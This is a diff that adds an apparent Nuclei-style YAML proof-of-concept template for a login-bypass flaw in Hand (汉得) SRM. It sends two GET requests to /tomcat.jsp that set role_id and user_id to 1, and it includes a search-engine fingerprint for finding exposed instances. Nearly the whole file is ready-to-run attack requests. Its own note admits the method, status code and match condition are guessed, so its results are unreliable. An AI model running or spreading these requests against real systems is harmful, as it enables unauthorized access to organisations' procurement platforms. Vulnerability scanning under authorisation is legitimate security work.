@@ -1,0 +1,32 @@
+id: poc-d78908bd3cd3df8b974c
+info:
+  name: 汉得SRMtomcat.jsp登录绕过漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d78908bd3cd3df8b974cde10bc774bad
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: d78908bd3cd3df8b974cde10bc774bad
+    fofa: + hunter：`app.name="汉得 SRM Going-Link"`
+http:
+- raw:
+  - 'GET /tomcat.jsp?dataName=role_id&dataValue=1 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /tomcat.jsp?dataName=user_id&dataValue=1 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
